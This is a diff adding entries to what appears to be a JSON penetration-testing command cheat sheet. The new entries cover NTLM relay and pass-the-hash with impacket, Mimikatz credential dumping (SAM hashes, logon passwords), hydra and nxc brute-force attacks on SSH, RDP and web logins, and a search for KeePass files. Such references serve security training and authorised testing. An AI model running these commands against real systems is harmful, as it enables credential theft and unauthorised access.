@@ -60,9 +60,65 @@
     {
       "id": 14,
       "Name": "Misc Linux"
+    },
+    {
+      "id": 15,
+      "Name": "Powershell"
+    },
+    {
+      "id": 16,
+      "Name": "Mimikatz"
     }
   ],
   "commands": [
+    {
+      "Name": "impacket-ntlmrelayx",
+      "Category": 9,
+      "Description": "Execute ntlm smb relay attack",
+      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'"
+    },
+    {
+      "Name": "impacket-psexec",
+      "Category": 9,
+      "Description": "Execute psexec on remote machine using NTLM hash",
+      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212"
+    },  
+    {
+      "Name": "mimikatz",
+      "Category": 16,
+      "Description": "Elevate to SYSTEM user privileges",
+      "Command": "token::elevate"
+    },        
+    {
+      "Name": "mimikatz",
+      "Category": 16,
+      "Description": "Enable SeDebugPrivilege access right",
+      "Command": "privilege::debug"
+    },    
+    {
+      "Name": "mimikatz",
+      "Category": 16,
+      "Description": "Extract the NTLM hashes from the SAM",
+      "Command": "lsadump::sam"
+    },  
+    {
+      "Name": "mimikatz",
+      "Category": 16,
+      "Description": "Attempts to extract plaintext passwords and paassword hashes from all available sources",
+      "Command": "sekurlsa::logonpasswords"
+    },    
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Get Local Users on Windows",
+      "Command": "Get-LocalUser"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Get Computer Info on Windows",
+      "Command": "Get-ComputerInfo"
+    },
     {
       "Name": "Start System Service",
       "Category": 9,
@@ -514,6 +570,12 @@
       "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ"
     },
     {
+      "Name": "wfuzz",
+      "Category": 3,
+      "Description": "File busting with extensions",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -z list,pdf,xls,txt,doc --hc 404 http://target-site/FUZZ.FUZ2Z"
+    },
+    {
       "Name": "nmap",
       "Category": 3,
       "Description": "Scan for open ports",
@@ -542,6 +604,30 @@
       "Category": 4,
       "Description": "Brute force login attempts",
       "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\""
+    },
+    {
+      "Name": "hydra",
+      "Category": 4,
+      "Description": "Brute force ssh with a wordlist",
+      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201"
+    },
+    {
+      "Name": "hydra",
+      "Category": 4,
+      "Description": "Brute force rdp with a wordlist",
+      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.213.202"
+    },
+    {
+      "Name": "nxc",
+      "Category": 4,
+      "Description": "Brute force rdp with a wordlist using nxc",
+      "Command": "nxc rdp 192.168.XXX.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding"
+    },
+    {
+      "Name": "hydra",
+      "Category": 4,
+      "Description": "Brute force basic auth with a wordlist",
+      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.213.201 http-get"
     },
     {
       "Name": "ffuf Brute",
@@ -668,6 +754,13 @@
       "Category": 9,
       "Description": "Port forwarding with chisel",
       "Command": "chisel server --port $PORT --proxy http://example.com"
+    },
+    {
+      "Name": "powershell",
+      "Category": 15,
+      "Description": "Recursive powershell search by wildcard extension",
+      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
     }
+
   ]
 }
